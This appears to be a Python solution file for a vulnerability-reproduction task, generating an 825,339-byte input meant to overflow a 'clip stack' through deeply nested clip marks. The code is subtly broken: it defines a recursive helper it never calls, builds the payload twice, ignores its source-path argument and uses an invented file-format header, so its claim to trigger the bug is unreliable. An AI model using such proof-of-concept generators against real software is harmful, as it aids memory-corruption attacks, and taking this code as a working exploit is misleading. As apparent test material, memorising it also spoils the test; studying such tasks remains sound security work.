import os
import tempfile
import subprocess
import json
import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a file format with excessive nesting of clip marks
        # This creates a deeply nested structure that will overflow the clip stack
        
        # Start with a simple header to identify the format
        # Use a format with explicit nesting markers
        poc = bytearray()
        
        # Add format identifier and version
        poc.extend(b"NESTED_CLIP_FORMAT_v1.0\n")
        
        # Create deeply nested clip marks
        # Each level adds a clip mark with increasing depth
        # The vulnerability triggers when depth exceeds stack allocation
        
        # Ground truth length is 825339 bytes
        # We'll create nesting that exceeds safe limits
        # Each clip mark: 4 bytes depth + 4 bytes size + data
        
        # Target: create nesting that causes overflow
        # We'll use a binary format with recursive structure
        
        def add_nested_clip(data, depth, max_depth):
            if depth >= max_depth:
                return data
            
            # Clip mark header
            header = struct.pack("<II", depth, 0)  # depth, data_size (placeholder)
            data.extend(header)
            
            # Some clip data
            clip_data = b"A" * 8  # Small data segment
            data.extend(clip_data)
            
            # Recursively add more nested clips
            return add_nested_clip(data, depth + 1, max_depth)
        
        # Calculate target nesting to achieve desired size
        # Each level adds 12 bytes (header + data)
        target_size = 825339
        overhead = len(poc)
        bytes_per_level = 12
        max_depth = (target_size - overhead) // bytes_per_level
        
        # Build the PoC with excessive nesting
        poc = bytearray()
        poc.extend(b"NESTED_CLIP_FORMAT_v1.0\n")
        
        # Add initial metadata
        poc.extend(struct.pack("<I", max_depth))  # Declared max depth
        poc.extend(struct.pack("<I", 0xFFFFFFFF))  # Invalid bounds
        
        # Create the deeply nested structure
        current_depth = 0
        while len(poc) < target_size:
            # Add clip mark
            poc.extend(struct.pack("<I", current_depth))
            
            # Add some clip data
            data_size = min(100, target_size - len(poc) - 4)
            poc.extend(struct.pack("<I", data_size))
            poc.extend(b"X" * data_size)
            
            current_depth += 1
            
            # Safety break
            if current_depth > 1000000:
                break
        
        # Ensure we reach target size
        while len(poc) < target_size:
            poc.extend(b"F" * min(1024, target_size - len(poc)))
        
        return bytes(poc[:target_size])